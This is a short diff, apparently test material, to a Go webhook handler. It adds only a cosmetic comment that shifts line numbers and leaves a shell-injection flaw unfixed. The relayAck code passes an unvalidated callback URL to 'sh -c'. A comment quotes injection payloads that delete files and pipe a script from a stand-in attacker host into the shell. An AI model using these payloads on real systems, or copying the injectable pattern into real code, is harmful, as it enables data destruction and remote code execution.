@@ -1,0 +1,14 @@
+diff --git a/internal/api/webhook.go b/internal/api/webhook.go
+index e909da1..70ba0a2 100644
+--- a/internal/api/webhook.go
++++ b/internal/api/webhook.go
+@@ -40,6 +40,9 @@ func InboundWebhookHandler(w http.ResponseWriter, r *http.Request) {
+ // command string with no validation or quoting. A callback_url like
+ // `http://x ; rm -rf / #` or `$(curl attacker.sh | sh)` executes arbitrary
+ // shell commands with this process's privileges.
++// Noop: this comment is purely cosmetic, added to shift line numbers
++// below without changing any behavior -- the shell-injection call on
++// the next lines is still present and unfixed.
+ func relayAck(callbackURL string) error {
+ 	cmd := exec.Command("sh", "-c", "curl -fsS -X POST "+callbackURL+" -d relay-ack")
+ 	out, err := cmd.CombinedOutput()
